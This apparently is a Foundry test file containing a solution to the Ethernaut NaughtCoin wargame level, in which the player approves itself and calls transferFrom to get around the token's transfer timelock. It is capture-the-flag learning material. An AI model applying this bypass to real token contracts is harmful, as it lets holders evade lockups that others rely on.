// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_15/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin coin;
    address alice;
    address bob;

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);
        coin = new NaughtCoin(alice);
    }

    function testAttack() public {
        uint256 aliceBal = coin.balanceOf(alice);
        vm.startPrank(alice);
        coin.approve(alice, aliceBal);

        coin.transferFrom(alice, bob, aliceBal);
        vm.stopPrank();

        assertEq(coin.balanceOf(alice), 0);
        assertEq(coin.balanceOf(bob), aliceBal);
    }
}
